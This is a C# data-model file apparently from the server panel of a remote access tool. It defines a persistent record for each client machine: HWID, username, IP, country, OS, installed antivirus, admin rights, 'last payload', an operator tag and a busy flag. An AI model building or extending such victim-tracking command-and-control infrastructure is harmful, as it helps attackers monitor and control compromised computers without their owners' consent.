using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.Text.Json.Serialization;
using System.Windows.Media.Imaging;

namespace SeroServer.Data;

/// <summary>
/// Persistent record for every client HWID ever seen.
/// Survives server restarts. Stored in clients.json.
/// </summary>
public class ClientRecord : INotifyPropertyChanged
{
    public event PropertyChangedEventHandler? PropertyChanged;
    private void Notify([CallerMemberName] string? p = null)
        => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(p));

    public string Hwid { get; set; } = string.Empty;
    public string LastUsername { get; set; } = string.Empty;
    public string LastIP { get; set; } = string.Empty;
    public string LastCountry { get; set; } = string.Empty;
    public string LastCountryCode { get; set; } = string.Empty;
    public string LastMachineName { get; set; } = string.Empty;
    public string LastOS        { get; set; } = string.Empty;
    public string LastPayload   { get; set; } = string.Empty;
    public string LastAntivirus { get; set; } = string.Empty;
    public string LastCpuName   { get; set; } = string.Empty;
    public string LastGpuName   { get; set; } = string.Empty;
    public long   LastRamUsed   { get; set; }
    public long   LastRamTotal  { get; set; }
    public string LastRamDisplay => LastRamTotal > 0 ? $"{LastRamUsed}/{LastRamTotal} MB" : "—";
    public bool   LastIsAdmin   { get; set; }
    public int    LastPort { get; set; }
    public string Tag    { get; set; } = string.Empty;
    public bool   HasTag => !string.IsNullOrEmpty(Tag);
    public string AssignedId { get; set; } = string.Empty;
    public DateTime FirstSeen        { get; set; } = DateTime.UtcNow;
    public DateTime LastSeen         { get; set; } = DateTime.UtcNow;
    public DateTime LastConnectedAt  { get; set; } = DateTime.MinValue;
    public List<ActivityEntry> ActivityLog { get; set; } = [];

    [JsonIgnore]
    private BitmapImage? _flagImage;

    [JsonIgnore]
    public BitmapImage? FlagImage
    {
        get => _flagImage;
        set { if (!ReferenceEquals(_flagImage, value)) { _flagImage = value; Notify(); } }
    }

    // Live reference to the connected client — null when offline.
    // Subscribes to the live client's PropertyChanged to forward real-time status changes
    // (idle seconds → StatusColor/Tooltip) to the AllClients DataGrid row.
    [JsonIgnore]
    private ConnectedClient? _liveClient;

    [JsonIgnore]
    public ConnectedClient? LiveClient
    {
        get => _liveClient;
        set
        {
            if (_liveClient != null) _liveClient.PropertyChanged -= OnLiveClientChanged;
            _liveClient = value;
            if (_liveClient != null) _liveClient.PropertyChanged += OnLiveClientChanged;
            Notify(nameof(StatusColor));
            Notify(nameof(StatusTooltip));
        }
    }

    private void OnLiveClientChanged(object? sender, System.ComponentModel.PropertyChangedEventArgs e)
    {
        if (e.PropertyName is nameof(ConnectedClient.StatusColor) or nameof(ConnectedClient.StatusTooltip))
        {
            Notify(nameof(StatusColor));
            Notify(nameof(StatusTooltip));
        }
        if (e.PropertyName == nameof(ConnectedClient.IsOperatorBusy))
            Notify(nameof(IsOperatorBusy));
    }

    [JsonIgnore] public string StatusColor    => _liveClient?.StatusColor    ?? "Grey";
    [JsonIgnore] public string StatusTooltip  => _liveClient?.StatusTooltip  ?? "Offline";
    [JsonIgnore] public bool   IsOperatorBusy => _liveClient?.IsOperatorBusy ?? false;
}

public class ActivityEntry
{
    public DateTime Time { get; set; } = DateTime.UtcNow;
    public string Action { get; set; } = string.Empty;
}
